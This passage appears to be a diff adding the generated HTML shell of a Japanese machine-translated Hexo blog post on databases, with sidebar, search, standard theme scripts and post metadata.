class="toc-number">7.</span> <span class="toc-text">情報を調べる</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%81%99%E3%81%B9%E3%81%A6%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E8%BF%94%E3%81%99"><span class="toc-number">8.</span> <span class="toc-text">すべてのデータを返す</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.png" data-sizes="auto" alt="Wray Lee" class="lazyload">
+  <div class="sidebar-author-name">Wray Lee</div>
+  <div class="sidebar-description">Wray Lee 的技术笔记：折腾、备忘与学习记录</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>投稿</div>
+    <div class="sidebar-state-number">778</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>カテゴリー</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>タグ</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wray-lee itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/ja/" aria-label="ホーム"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">ホーム</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/ja/archives" aria-label="アーカイブ"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">アーカイブ</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/ja/about" aria-label="プロフィール"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">プロフィール</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Wray Lee",
+          title: "データベース",
+          url: "https://blog.wray7.top/2023/09/04/2023-09-04-%E6%95%B0%E6%8D%AE%E5%BA%93.ja/",
+          excerpt: "",
+          description: "",
+          stripContent: " この記事は中国語から AI により機械翻訳されたものです。正確性については中国語の原文を参照してください。   リレーショナル：表と似ている mysql、Oracle、microsoft sql server、acess 非リレーショナル：分散型で、ACID 原則の遵守を保証しない。MongoDb、Redis、HBase  制約の種類 主キー制約（primary key）：このフィールドが非 NULL かつ一意であることを保証する。1 つの表には主キーを 1 つだけ持つことができ、主キーは表中",
+          date: "Mon Sep 04 2023 00:00:00 GMT+0800",
+          updated: "Sun Oct 11 2026 04:47:33 GMT+0800",
+          cover: "https://www.dmoe.cc/random.php",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.6' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
